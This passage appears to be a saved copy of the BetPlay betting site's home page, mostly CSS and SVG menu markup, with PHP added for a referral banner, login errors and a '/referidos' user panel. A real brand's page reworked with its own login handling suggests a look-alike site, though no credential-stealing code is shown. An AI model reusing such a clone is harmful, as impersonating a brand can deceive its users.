      .apuestale[_ngcontent-serverApp-c170135771] {
        min-height: 160px
      }

      .play-title[_ngcontent-serverApp-c170135771] {
        font-size: 1.2em;
        padding: 1em 2em 0
      }

      .hometextos[_ngcontent-serverApp-c170135771] {
        font-size: .8em
      }

      .play-btn[_ngcontent-serverApp-c170135771] {
        min-width: 130px
      }

      .play-btn[_ngcontent-serverApp-c170135771] h3[_ngcontent-serverApp-c170135771] {
        font-size: 14px
      }

      .homedisp[_ngcontent-serverApp-c170135771] .ubicacion[_ngcontent-serverApp-c170135771] {
        order: 4
      }

      .homedisp[_ngcontent-serverApp-c170135771] .content-first-carousel[_ngcontent-serverApp-c170135771] {
        order: 1
      }

      .homedisp[_ngcontent-serverApp-c170135771] .apuestale[_ngcontent-serverApp-c170135771] {
        order: 2
      }

      .homedisp[_ngcontent-serverApp-c170135771] .homeenlaces[_ngcontent-serverApp-c170135771] {
        order: 3
      }

      .homedisp[_ngcontent-serverApp-c170135771] .homejuegos[_ngcontent-serverApp-c170135771] {
        order: 5
      }
    }

    @media only screen and (min-width: 426px) and (max-width: 800px) {
      .jackpod[_ngcontent-serverApp-c170135771] iframe[_ngcontent-serverApp-c170135771] {
        height: auto
      }

      .homeenlaces[_ngcontent-serverApp-c170135771] {
        grid-template-rows: 1fr 1fr 1fr;
        grid-template-columns: 1fr
      }

      .homeenlaces[_ngcontent-serverApp-c170135771] .bordesinfo[_ngcontent-serverApp-c170135771] {
        max-width: 300px;
        margin: 0 5% 0 12%
      }

      .casinostexto[_ngcontent-serverApp-c170135771] {
        grid-row: 2/3
      }

      .casinoimg[_ngcontent-serverApp-c170135771] {
        grid-row: 1/2
      }

      .play-title[_ngcontent-serverApp-c170135771] {
        padding: 1em 3em 0
      }
    }

    a[_ngcontent-serverApp-c170135771] {
      text-decoration: none
    }
  </style>
  <style>
    .overlay[_ngcontent-serverApp-c2988504344] {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 24, 73, .856);
      z-index: 999;
      transition: opacity .5s ease-in-out;
      opacity: 1
    }

    .overlay-hidden[_ngcontent-serverApp-c2988504344] {
      opacity: 0;
      z-index: 0
    }

    .widget-container[_ngcontent-serverApp-c2988504344] {
      position: fixed;
      bottom: 6%;
      right: 2%;
      z-index: 1001;
      display: flex;
      flex-direction: column;
      align-items: flex-end
    }

    .menu[_ngcontent-serverApp-c2988504344] {
      background: transparent;
      display: flex;
      flex-direction: column;
      align-items: center;
      position: absolute;
      bottom: 60px;
      right: 0;
      padding: 1px;
      width: 190px;
      height: 163px;
      justify-content: center;
      opacity: 1;
      transition: opacity .3s ease-in-out
    }

    .menu-hidden[_ngcontent-serverApp-c2988504344] {
      opacity: 0
    }

    .menu[_ngcontent-serverApp-c2988504344] ul[_ngcontent-serverApp-c2988504344] {
      list-style-type: none;
      display: flex;
      align-items: flex-end;
      cursor: pointer;
      color: #fff;
      margin: 0;
      flex-direction: column;
      padding: 0;
      width: 100%;
      font-size: 14px;
      position: absolute;
      bottom: 15px
    }

    .menu[_ngcontent-serverApp-c2988504344] li[_ngcontent-serverApp-c2988504344] {
      list-style-type: none;
      display: flex;
      align-items: center;
      margin-bottom: 30px;
      cursor: pointer;
      color: #fff;
      transition: all .3s ease-in-out
    }

    .menu[_ngcontent-serverApp-c2988504344] li[_ngcontent-serverApp-c2988504344] a[_ngcontent-serverApp-c2988504344] {
      color: #fff
    }

    .menu[_ngcontent-serverApp-c2988504344] li[_ngcontent-serverApp-c2988504344]:hover {
      text-shadow: 0 0 5px rgba(255, 255, 255, .5), 0 0 10px rgba(255, 255, 255, .3);
      transform: scale(1.05)
    }

    .menu[_ngcontent-serverApp-c2988504344] li[_ngcontent-serverApp-c2988504344] img[_ngcontent-serverApp-c2988504344] {
      margin-left: 11px
    }

    button[_ngcontent-serverApp-c2988504344] {
      border: none;
      border-radius: 50%;
      width: 135px;
      height: 105px;
      color: #fff;
      font-size: 24px;
      cursor: pointer;
      transition: width .12s ease-out
    }

    button.active[_ngcontent-serverApp-c2988504344] {
      background-color: #3bb4e5;
      width: 70px;
      height: 70px
    }

    button.inactive[_ngcontent-serverApp-c2988504344] {
      background-color: transparent
    }

    button.active[_ngcontent-serverApp-c2988504344]:after,
    button.active[_ngcontent-serverApp-c2988504344]:before {
      background-color: #000000d3;
      content: "";
      position: absolute;
      top: 50%;
      left: 50%;
      width: 25px;
      height: 3px;
      border-radius: 5px
    }

    button.active[_ngcontent-serverApp-c2988504344]:before {
      transform: translate(-50%, -50%) rotate(45deg)
    }

    button.active[_ngcontent-serverApp-c2988504344]:after {
      transform: translate(-50%, -50%) rotate(-45deg)
    }

    button[_ngcontent-serverApp-c2988504344] img[_ngcontent-serverApp-c2988504344] {
      transition: opacity .5s ease-in-out;
      width: 100%;
      height: auto;
      display: block;
      border: none;
      margin: 0;
      padding: 0
    }

    @media (max-width: 600px) {
      .menu[_ngcontent-serverApp-c2988504344] {
        bottom: 50px;
        right: 4px
      }

      button[_ngcontent-serverApp-c2988504344] {
        width: 120px;
        height: 78px
      }

      button.active[_ngcontent-serverApp-c2988504344] {
        width: 60px;
        height: 60px
      }
    }

    @media (max-width: 375px) {
      button[_ngcontent-serverApp-c2988504344] {
        width: 115px;
        height: 75px
      }
    }
  </style>
  <style>
    .formularioinput[_ngcontent-serverApp-c2129232468] {
      display: grid !important;
      grid-template-columns: 2fr 2fr 2fr 1fr;
      grid-gap: 1%;
      align-items: baseline
    }

    .btn-inicio[_ngcontent-serverApp-c2129232468] {
      border: 1px solid #3CB4E5;
      background: #002361;
      color: #fff;
      height: 35px !important;
      margin: 0 5% 0 0;
      border-radius: 3px
    }

    .btn-inicio[_ngcontent-serverApp-c2129232468]:hover {
      transform: scale(1.1)
    }

    .btn-registro[_ngcontent-serverApp-c2129232468] {
      color: #002361;
      background-color: #3cb4e5;
      border: none;
      height: 35px !important;
      border-radius: 3px
    }

    .btn-registro[_ngcontent-serverApp-c2129232468]:hover {
      transform: scale(1.1)
    }

    .text-recuperarpass[_ngcontent-serverApp-c2129232468] {
      color: #3cb4e5;
      font-size: 1em
    }

    .inciosesion[_ngcontent-serverApp-c2129232468] {
      height: 35px;
      font-weight: 400;
      line-height: 1.5;
      color: #495057;
      background-color: #fff;
      background-clip: padding-box;
      border: 1px solid #ced4da;
      border-radius: .15rem;
      transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
      width: 95%
    }

    .formularioinput-botones[_ngcontent-serverApp-c2129232468] {
      display: flex
    }
  </style>
</head>

<body style="overflow: auto;">
    <?php if ($mostrarRef): ?><div class="ref-banner">Te refirió: <b><?= htmlspecialchars($ref) ?></b></div><?php endif; ?>
<?php if ($error !== ''): ?><div class="login-err"><?= htmlspecialchars($error) ?></div><?php endif; ?>
<?php if (!empty($_SESSION['uid'])): ?><a class="floating-panel" href="/referidos/panel.php">Mi panel</a><?php endif; ?>

<style>
  .ref-banner{position:sticky;top:0;z-index:99999;background:#00ae42;color:#fff;text-align:center;padding:9px 12px;font-family:Montserrat,sans-serif;font-weight:700;font-size:14px}
  .floating-panel{position:fixed;right:16px;bottom:16px;z-index:99999;background:#002361;color:#fff;padding:11px 18px;border-radius:50px;font-family:Montserrat,sans-serif;font-weight:700;font-size:13px;text-decoration:none;box-shadow:0 6px 20px rgba(0,0,0,.35)}
  .login-err{position:fixed;top:52px;left:50%;transform:translateX(-50%);z-index:99999;background:#f44336;color:#fff;padding:11px 18px;border-radius:6px;font-family:Montserrat,sans-serif;font-size:13px}
</style>
  <div id="apifycloud-chat-iframe-container" style="display: none"></div>
  <app-root _nghost-serverapp-c1557493016="" class="ng-tns-c1557493016-0"
    ng-version="16.2.12"><!----><mat-drawer-container _ngcontent-serverapp-c1557493016="" ngskiphydration=""
      class="mat-drawer-container main_container custom-drawer-container ng-tns-c1557493016-0" style="margin: 0;">
      <div class="mat-drawer-backdrop ng-star-inserted"></div><!---->
      <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div><mat-drawer
        _ngcontent-serverapp-c1557493016="" tabindex="-1" ngskiphydration="" mode="push"
        class="mat-drawer ng-tns-c2384444419-1 ng-trigger ng-trigger-transform ng-star-inserted mat-drawer-push"
        style="box-shadow: none; visibility: hidden;">
        <div cdkscrollable="" class="mat-drawer-inner-container ng-tns-c2384444419-1"><app-navbar
            _ngcontent-serverapp-c1557493016="" class="ng-tns-c2384444419-1">
            <nav>
              <ul><button class="d-block text-white menu-button2"><i class="fas fa-times"></i></button><a
                  data-menu-item="Promociones" href="/promociones">
                  <li><svg id="Componente_51_2" data-name="Componente 51 – 2" xmlns="http://www.w3.org/2000/svg"
                      width="160.601" height="27.83" viewBox="0 0 160.601 27.83"><text id="Promociones"
                        transform="translate(59.6 18.966)" fill="#fff" font-size="13" font-family="Montserrat"
                        font-weight="500">
                        <tspan font-family="Montserrat" x="0" y="0"> Promociones </tspan>
                      </text>
                      <path id="Trazado_1116" data-name="Trazado 1116"
                        d="M193.616,174.53h-2.839a2.759,2.759,0,0,0,.554-.62,2.84,2.84,0,0,0,.279-2.49.454.454,0,0,0-.028-.044c0-.017,0-.035-.009-.051a2.836,2.836,0,0,0-1.873-1.664,2.924,2.924,0,0,0-1.954.176,2.654,2.654,0,0,0,.036-1.556,2.806,2.806,0,0,0-1.7-1.832h0a2.8,2.8,0,0,0-2.478.312,2.63,2.63,0,0,0-.76.795,2.63,2.63,0,0,0-.76-.795,2.805,2.805,0,0,0-2.478-.312h0a2.807,2.807,0,0,0-1.7,1.832,2.647,2.647,0,0,0,.021,1.515,2.9,2.9,0,0,0-1.859-.134,2.836,2.836,0,0,0-1.873,1.664c-.006.017,0,.034-.009.051a.374.374,0,0,0-.028.044,2.838,2.838,0,0,0,.279,2.49,2.746,2.746,0,0,0,.554.62H171.5a1.514,1.514,0,0,0-1.512,1.512v3a1.509,1.509,0,0,0,1.4,1.5v12.06a1.514,1.514,0,0,0,1.513,1.512h19.321a1.514,1.514,0,0,0,1.512-1.512v-12.06a1.509,1.509,0,0,0,1.4-1.5v-3A1.514,1.514,0,0,0,193.616,174.53Zm-12.9,1.073h3.882v17.442h-3.882Zm8.7-4.908a1.769,1.769,0,0,1,1.157,1.018c.006.015.019.025.025.04a.469.469,0,0,0,.008.046,1.771,1.771,0,0,1-.178,1.531,2.135,2.135,0,0,1-1.75.885,30.49,30.49,0,0,1-4.463,0c.362-.341.749-.738,1.148-1.171.606-.562,1.325-1.184,2.161-1.841A2.134,2.134,0,0,1,189.416,170.7Zm-6.062-1.46a2,2,0,0,1,.794-1.669,1.763,1.763,0,0,1,2.7.981,2,2,0,0,1-.464,1.789c-.381.49-.751.939-1.1,1.348-.678.6-1.3,1.183-1.8,1.715A28.759,28.759,0,0,1,183.355,169.236Zm-4.513-.688a1.763,1.763,0,0,1,2.7-.981,2,2,0,0,1,.794,1.668,29.024,29.024,0,0,1-.113,4.089c-.567-.592-1.268-1.25-2.035-1.909-.284-.337-.577-.693-.877-1.079A1.994,1.994,0,0,1,178.841,168.548Zm-2.493,2.148a2.135,2.135,0,0,1,1.893.513c.638.5,1.2.98,1.71,1.431.53.6,1.049,1.138,1.525,1.586a30.766,30.766,0,0,1-4.389-.01,2.135,2.135,0,0,1-1.75-.885,1.769,1.769,0,0,1-.178-1.531.372.372,0,0,0,.007-.046.414.414,0,0,0,.026-.04A1.769,1.769,0,0,1,176.348,170.7Zm-5.286,8.351v-3a.44.44,0,0,1,.439-.439h8.138v3.882H171.5A.44.44,0,0,1,171.062,179.047Zm1.4,13.56V180.559h7.18v12.487H172.9A.439.439,0,0,1,172.459,192.607Zm19.76.439h-6.552V180.559h6.991v12.048A.44.44,0,0,1,192.219,193.046Zm1.836-14a.44.44,0,0,1-.439.439h-7.948V175.6h7.948a.44.44,0,0,1,.439.439Z"
                        transform="translate(-169.989 -166.289)" fill="#fff" class="color"></path>
                    </svg></li>
                </a><a data-menu-item="Deportes" href="/apuestas#home">
                  <li><svg xmlns="http://www.w3.org/2000/svg" width="132.515" height="27.809"
                      viewBox="0 0 132.515 27.809">
                      <g id="Componente_84_5" data-name="Componente 84 – 5" transform="translate(0.75 0.75)">
                        <g id="Grupo_889" data-name="Grupo 889" transform="translate(0 0)">
                          <path id="Trazado_1005" data-name="Trazado 1005"
                            d="M36.72,44.748,35,38.441,40.161,35l5.161,3.441L43.6,44.748Z"
                            transform="translate(-26.972 -27.041)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></path>
                          <path id="Trazado_1006" data-name="Trazado 1006" d="M45.109,22.28l-4.329,2.707L36.45,22.28"
                            transform="translate(-27.59 -21.615)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></path>
                          <path id="Trazado_1007" data-name="Trazado 1007" d="M23.682,30.12l1.239,4.949-3.911,3.28"
                            transform="translate(-21.004 -24.959)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></path>
                          <path id="Trazado_1008" data-name="Trazado 1008" d="M25.12,57.13l5.086.356,1.91,4.737"
                            transform="translate(-22.757 -36.48)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></path>
                          <path id="Trazado_1009" data-name="Trazado 1009" d="M50.69,62.216l1.91-4.731,5.081-.356"
                            transform="translate(-33.665 -36.48)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></path>
                          <path id="Trazado_1010" data-name="Trazado 1010" d="M64.068,38.349l-3.928-3.3,1.239-4.972"
                            transform="translate(-37.696 -24.942)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></path>
                          <circle id="Elipse_55" data-name="Elipse 55" cx="13.155" cy="13.155" r="13.155"
                            transform="translate(0 0)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></circle>
                          <line id="Línea_58" data-name="Línea 58" y2="5.262" transform="translate(13.531 3.007)"
                            fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="1.5"></line>
                          <line id="Línea_59" data-name="Línea 59" y1="0.752" x2="4.51"
                            transform="translate(18.041 10.524)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></line>
                          <line id="Línea_60" data-name="Línea 60" x2="2.255" y2="3.007"
                            transform="translate(16.537 18.041)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></line>
                          <line id="Línea_61" data-name="Línea 61" y1="3.007" x2="2.255"
                            transform="translate(7.517 18.041)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></line>
                          <line id="Línea_62" data-name="Línea 62" x2="4.51" y2="0.752"
                            transform="translate(3.758 10.524)" fill="none" stroke="#fff" stroke-miterlimit="10"
                            stroke-width="1.5"></line>
                        </g><text id="Deportes" transform="translate(60.764 18.655)" fill="#fff" font-size="13"
                          font-family="Montserrat-Medium, Montserrat" font-weight="500">
                          <tspan x="0" y="0"> Deportes </tspan>
                        </text>
                      </g>
                    </svg></li>
                </a><a data-menu-item="E-sports" href="/apuestas#sports-hub/esports" class="ng-star-inserted" style="">
                  <li class="d-block">
                    <div class="d-flex"><img
                        id="Componente_42_5" data-name="Componente 42 – 5" xmlns="http://www.w3.org/2000/svg"
                        width="335.765" height="26.287" viewBox="0 0 335.765 26.287">
                      <g id="Grupo_893" data-name="Grupo 893" transform="translate(0 0)"></g><text
                        id="Transmisión_en_vivo" data-name="Transmisión en vivo" transform="translate(60.764 18.67)"
                        fill="#fff" font-size="22" font-family="Montserrat-Medium, Montserrat" font-weight="500">
                        <tspan x="0" y="0"> E-sports </tspan>
                      </text>
                      </svg>
                    </div>
                  </li>
                </a><!----><a data-menu-item="Transmisión_en_vivo" href="/apuestas#filter/all/all/all/all/streaming"
                  class="ng-star-inserted" style="">
                  <li class="d-block"><svg id="Componente_42_5" data-name="Componente 42 – 5"
                      xmlns="http://www.w3.org/2000/svg" width="211.765" height="26.287" viewBox="0 0 211.765 26.287">
                      <g id="Grupo_893" data-name="Grupo 893" transform="translate(0 0)">
                        <g id="Rectángulo_461" data-name="Rectángulo 461" transform="translate(0 0)" fill="none"
                          stroke="#fff" stroke-width="1.5">
                          <rect width="26.287" height="26.287" rx="6" stroke="none"></rect>
                          <rect x="0.75" y="0.75" width="24.787" height="24.787" rx="5.25" fill="none"></rect>
                        </g>
                        <g id="Polígono_1" data-name="Polígono 1" transform="translate(22.688 4.538) rotate(90)"
                          fill="none">
                          <path
                            d="M5.933,5.24a3,3,0,0,1,5.345,0l1.275,2.5q.054.106.117.208l1.588,2.583a3,3,0,0,1-2.68,4.569L8.73,14.981q-.125-.005-.249,0L5.633,15.1a3,3,0,0,1-2.68-4.569L4.541,7.948q.063-.1.117-.208Z"
                            stroke="none"></path>
                          <path
                            d="M 8.605781555175781 5.102801322937012 C 8.030461311340332 5.102801322937012 7.530941963195801 5.408771514892578 7.26954174041748 5.921271324157715 L 5.994561195373535 8.421061515808105 C 5.940521240234375 8.526991844177246 5.881551742553711 8.632041931152344 5.819291114807129 8.733322143554688 L 4.230901718139648 11.3166618347168 C 3.814871788024902 11.9932918548584 4.069701194763184 12.6025218963623 4.19857120513916 12.83304214477539 C 4.467931747436523 13.31485176086426 4.954691886901855 13.60250186920166 5.50067138671875 13.60250186920166 C 5.523841857910156 13.60250186920166 5.547371864318848 13.60201168060303 5.571002006530762 13.6010217666626 L 8.41871166229248 13.48263168334961 C 8.542950630187988 13.47745132446289 8.668752670288086 13.47746086120605 8.79271125793457 13.48262214660645 L 11.64050102233887 13.6010217666626 C 11.66414165496826 13.60200119018555 11.68757152557373 13.60250186920166 11.71089172363281 13.60250186920166 C 12.25677108764648 13.60250186920166 12.74350166320801 13.31482124328613 13.01288223266602 12.83297157287598 C 13.14176177978516 12.60243225097656 13.39662170410156 11.9931812286377 12.98065185546875 11.3166618347168 L 11.39220142364502 8.733222007751465 C 11.3298511505127 8.631792068481445 11.27086162567139 8.526681900024414 11.21694183349609 8.420931816101074 L 9.942010879516602 5.921271324157715 C 9.680611610412598 5.408771514892578 9.18109130859375 5.102801322937012 8.605781555175781 5.102801322937012 M 8.605780601501465 3.602799415588379 C 9.663711547851562 3.602799415588379 10.72164154052734 4.148447036743164 11.27824211120605 5.239741325378418 L 12.55317115783691 7.739401817321777 C 12.58935165405273 7.810351371765137 12.62835121154785 7.87982177734375 12.6700611114502 7.947671890258789 L 14.25844192504883 10.53100204467773 C 15.51688194274902 12.57771110534668 13.97879791259766 15.19953060150146 11.57825088500977 15.0997314453125 L 8.730401992797852 14.98133182525635 C 8.647361755371094 14.97787189483643 8.564201354980469 14.97787189483643 8.481161117553711 14.98133182525635 L 5.63331127166748 15.0997314453125 C 3.232742309570312 15.19953346252441 1.694683074951172 12.57771110534668 2.95311164855957 10.53100204467773 L 4.541501998901367 7.947661399841309 C 4.583211898803711 7.87982177734375 4.622201919555664 7.810351371765137 4.658391952514648 7.739411354064941 L 5.933311462402344 5.239741325378418 C 6.489916801452637 4.148447036743164 7.547848701477051 3.602799415588379 8.605780601501465 3.602799415588379 Z"
                            stroke="none" fill="#fff"></path>
                        </g>
                      </g><text id="Transmisión_en_vivo" data-name="Transmisión en vivo"
                        transform="translate(60.764 18.67)" fill="#fff" font-size="13"
                        font-family="Montserrat-Medium, Montserrat" font-weight="500">
                        <tspan x="0" y="0"> Transmisión en vivo </tspan>
                      </text>
                    </svg></li>
                </a><!----><a data-menu-item="Virtuales" href="/virtuales" class="ng-star-inserted" style="">
                  <li><svg id="Componente_50_5" data-name="Componente 50 – 5" xmlns="http://www.w3.org/2000/svg"
                      width="132.382" height="27.283" viewBox="0 0 132.382 27.283"><text id="Virtuales"
                        transform="translate(64.382 17.32)" fill="#fff" font-size="13"
                        font-family="Montserrat-Medium, Montserrat" font-weight="500">
                        <tspan x="0" y="0"> Virtuales </tspan>
                      </text>
                      <path id="Trazado_1050" data-name="Trazado 1050"
                        d="M97.679,104.812a.531.531,0,0,0-.323-.327l-2.576-.925-.433-.769a1.014,1.014,0,0,0-.677-.5l-2.472-.515a1.6,1.6,0,0,0-1.666.687l-3.609,5.47a1.654,1.654,0,0,1-1.121.721,49.469,49.469,0,0,1-8.265.651,12.341,12.341,0,0,0-4.356.671,10.92,10.92,0,0,0-1.21.5c-.7-.041-4.806-.162-5.424,2.542-.576,2.522,1.238,5.08,1.546,5.492,0,.027,0,.055,0,.081-.044,1.558-.05,1.8-1.135,2.434a9.362,9.362,0,0,0-2.676,1.989.53.53,0,0,0-.1.3l-.142,5.17a.531.531,0,0,0,.531.546H65.8a.531.531,0,0,0,.5-.7l-.055-.165a1.781,1.781,0,0,0-.9-1.033c.047-1.087.371-3.12,1.535-3.68a18.57,18.57,0,0,0,1.977-1.1,3.932,3.932,0,0,1,.06,1.473.531.531,0,1,0,1.048.175,5.228,5.228,0,0,0-.176-2.3q.23-.174.457-.361a7.6,7.6,0,0,0,2.577-3.521c.1-.326.369-1.105.416-1.2a1.96,1.96,0,0,1,1.046-.925,1.98,1.98,0,0,1,1.52.054l5.238,2.417a10.485,10.485,0,0,0,4.2.957,16.243,16.243,0,0,1,.175,6.282,1.913,1.913,0,0,0,.165,1.214l.986,1.973a.531.531,0,0,0,.475.294h2.125a.531.531,0,0,0,.459-.8l-.208-.357a1.7,1.7,0,0,0-.9-.74l-.306-.968.431-7.274a2.691,2.691,0,0,1,.419-1.3,7.789,7.789,0,0,0,1.127-4.473c-.056-2.578,1.655-5.49,2.195-6.342l2.863.166a2.3,2.3,0,0,0,2.073-1.065l.295-.467A.531.531,0,0,0,97.679,104.812Zm-31.094,8.447c.246-1.078,1.529-1.49,2.646-1.642a5.32,5.32,0,0,0-1.83,3.275c-.1.655-.162,1.23-.206,1.741A5.257,5.257,0,0,1,66.586,113.259ZM95.32,105.74l-3.17-.184a1.031,1.031,0,0,1-.733-.372l-.531-.643a.531.531,0,0,0-.819.677l.531.643a2.091,2.091,0,0,0,.689.543,13.6,13.6,0,0,0-2.148,6.6,6.808,6.808,0,0,1-.958,3.873,3.755,3.755,0,0,0-.587,1.815l-.437,7.372a.532.532,0,0,0,.024.191l.425,1.346a.529.529,0,0,0,.145.23h-.373l-.84-1.679a.845.845,0,0,1-.072-.537A18.322,18.322,0,0,0,84.986,114.9a.531.531,0,0,0-.972.429,19.584,19.584,0,0,1,.973,2.726,9.42,9.42,0,0,1-3.5-.85l-5.238-2.417a3.048,3.048,0,0,0-2.341-.083h0c.186-.462.3-.7.3-.708a.531.531,0,0,0-.96-.455,31.924,31.924,0,0,0-1.444,3.967c-.258.844-1.3,3.02-5.388,4.988-2.194,1.057-2.145,4.86-2.142,5.022a.531.531,0,0,0,.266.45h-.428l.121-4.428a11.646,11.646,0,0,1,2.257-1.594c1.593-.934,1.614-1.682,1.66-3.32a27.388,27.388,0,0,1,.3-3.575c.277-1.854,1.649-3.222,4.079-4.065a11.284,11.284,0,0,1,3.982-.612,50.532,50.532,0,0,0,8.455-.663,2.719,2.719,0,0,0,1.842-1.186l3.609-5.47a.537.537,0,0,1,.519-.238l1.216.25,1.277.266.924,1.206,2.013.722A1.235,1.235,0,0,1,95.32,105.74Z"
                        transform="translate(-63.04 -101.746)" fill="#fff" class="color"></path>
                    </svg></li>
                </a><!----><a data-menu-item="Blog" href="/blog">
                  <li><svg id="Componente_50_7" data-name="Componente 50 – 7" xmlns="http://www.w3.org/2000/svg"
                      width="98.941" height="25.314" viewBox="0 0 98.941 25.314"><text id="Blog"
                        transform="translate(62.942 16.601)" fill="#fff" font-size="13"
                        font-family="Montserrat-Medium, Montserrat" font-weight="500">
                        <tspan x="0" y="0"> Blog </tspan>
                      </text>
                      <g id="Grupo_2330" data-name="Grupo 2330" transform="translate(-863.891 -445.842)">
                        <path id="Trazado_1984" data-name="Trazado 1984"
                          d="M877.163,445.842a12.295,12.295,0,1,1-4.342,23.8,28.765,28.765,0,0,1-8.251,1.514.632.632,0,0,1-.5-1.066,13.182,13.182,0,0,0,3.171-4.7,12.294,12.294,0,0,1,9.926-19.549Zm10.765,12.295a10.765,10.765,0,1,0-19.242,6.639l.245.312-.116.381a12.3,12.3,0,0,1-2.143,3.98,22.4,22.4,0,0,0,5.866-1.336l.286-.116.284.116a10.772,10.772,0,0,0,14.819-9.976Z"
                          transform="translate(0 0)" fill="#fff"></path>
                        <path id="Trazado_1985" data-name="Trazado 1985"
                          d="M919.041,527.668a1.411,1.411,0,1,1-1.411,1.411,1.411,1.411,0,0,1,1.411-1.411Z"
                          transform="translate(-46.591 -70.942)" fill="#fff" fill-rule="evenodd"></path>
                        <path id="Trazado_1986" data-name="Trazado 1986"
                          d="M954.477,527.668a1.411,1.411,0,1,1-1.411,1.411,1.411,1.411,0,0,1,1.411-1.411Z"
                          transform="translate(-77.314 -70.942)" fill="#fff" fill-rule="evenodd"></path>
                        <path id="Trazado_1987" data-name="Trazado 1987"
                          d="M989.914,527.668a1.411,1.411,0,1,1-1.411,1.411,1.411,1.411,0,0,1,1.411-1.411Z"
                          transform="translate(-108.037 -70.942)" fill="#fff" fill-rule="evenodd"></path>
                      </g>
                    </svg></li>
                </a><a data-menu-item="Tiendas" href="/tiendas" class="ng-star-inserted" style="">
                  <li><svg xmlns="http://www.w3.org/2000/svg" width="119.437" height="26.482"
                      viewBox="0 0 119.437 26.482">
                      <g id="Componente_53_2" data-name="Componente 53 – 2" transform="translate(0.836 0.75)"><text
                          id="Tiendas" transform="translate(59.601 17.797)" fill="#fff" font-size="13"
                          font-family="Montserrat-Medium, Montserrat" font-weight="500">
                          <tspan x="0" y="0"> Tiendas </tspan>
                        </text>
                        <g id="Grupo_775" data-name="Grupo 775">
                          <path id="Trazado_945" data-name="Trazado 945"
                            d="M-52.181,115.268a3.027,3.027,0,0,0,3.027,3.027,3.02,3.02,0,0,0,1.178-.238A2.972,2.972,0,0,0-46.4,114.4l-2.218-6.96A1.446,1.446,0,0,0-50,106.436H-66.47a1.446,1.446,0,0,0-1.378,1.007l-2.218,6.96a2.972,2.972,0,0,0,1.573,3.653,3.024,3.024,0,0,0,1.178.238,3.027,3.027,0,0,0,3.027-3.027,3.027,3.027,0,0,0,3.027,3.027,3.027,3.027,0,0,0,3.027-3.027,3.027,3.027,0,0,0,3.027,3.027A3.027,3.027,0,0,0-52.181,115.268Z"
                            transform="translate(70.214 -106.436)" fill="none" stroke="#fff" stroke-linecap="round"
                            stroke-miterlimit="10" stroke-width="1.5"></path>
                          <path id="Trazado_946" data-name="Trazado 946"
                            d="M-46.173,130v11.23a2.052,2.052,0,0,1-2.052,2.052H-64.209a2.052,2.052,0,0,1-2.052-2.052V130"
                            transform="translate(68.224 -118.3)" fill="none" stroke="#fff" stroke-linecap="round"
                            stroke-miterlimit="10" stroke-width="1.5"></path>
                          <g id="Rectángulo_387" data-name="Rectángulo 387" transform="translate(8.949 14.033)"
                            fill="none" stroke="#fff" stroke-width="1.5">
                            <path d="M2,0H3.875a2,2,0,0,1,2,2v9.015a0,0,0,0,1,0,0H0a0,0,0,0,1,0,0V2A2,2,0,0,1,2,0Z"
                              stroke="none"></path>
                            <path
                              d="M2,.75H3.875A1.25,1.25,0,0,1,5.125,2v8.265a0,0,0,0,1,0,0H.75a0,0,0,0,1,0,0V2A1.25,1.25,0,0,1,2,.75Z"
                              fill="none"></path>
                          </g>
                        </g>
                      </g>
                    </svg></li>
                </a><!----><a href="/app-BetPlay">
                  <li class="d-block"><svg id="Componente_52_5" data-name="Componente 52 – 5"
                      xmlns="http://www.w3.org/2000/svg" width="150.099" height="25.896"
                      viewBox="0 0 150.099 25.896"><text id="App_BetPlay" data-name="App BetPlay"
                        transform="translate(55.099 18.592)" fill="#fff" font-size="13"
                        font-family="Montserrat-Medium, Montserrat" font-weight="500">
                        <tspan x="0" y="0"> App BetPlay </tspan>
                      </text>
                      <g id="Grupo_924" data-name="Grupo 924">
                        <g id="Rectángulo_645" data-name="Rectángulo 645" transform="translate(0 0)" fill="none"
                          stroke="#FFF" stroke-width="1.5">
                          <rect width="15.538" height="25.897" rx="2" stroke="none"></rect>
                          <rect x="0.75" y="0.75" width="14.038" height="24.397" rx="1.25" fill="none"></rect>
                        </g>
                        <line id="Línea_65" data-name="Línea 65" x2="14.502" transform="translate(0.518 19.164)"
                          fill="none" stroke="#FFF" stroke-width="1.5"></line>
                        <line id="Línea_66" data-name="Línea 66" x2="4.144" transform="translate(5.697 22.271)"
                          fill="none" stroke="#FFF" stroke-linecap="round" stroke-width="1.5"></line>
                      </g>
                    </svg></li>
                </a><a data-menu-item="Redimir_Bono" href="/menuusuario?optionMenu=4" class="ng-star-inserted" style="">
                  <li><svg id="Componente_53_7" data-name="Componente 53 – 7" xmlns="http://www.w3.org/2000/svg"
                      width="169.064" height="37.902" viewBox="0 0 169.064 37.902"><text id="Redimir_Bono"
                        data-name="Redimir Bono" transform="translate(63.064 23.756)" fill="#fff" font-size="13"
                        font-family="Montserrat-Medium, Montserrat" font-weight="500">
                        <tspan x="0" y="0"> Redimir Bono </tspan>
                      </text>
                      <g id="Grupo_2339" data-name="Grupo 2339" transform="translate(-4400.159 -2016.5)">
                        <path id="Trazado_1992" data-name="Trazado 1992"
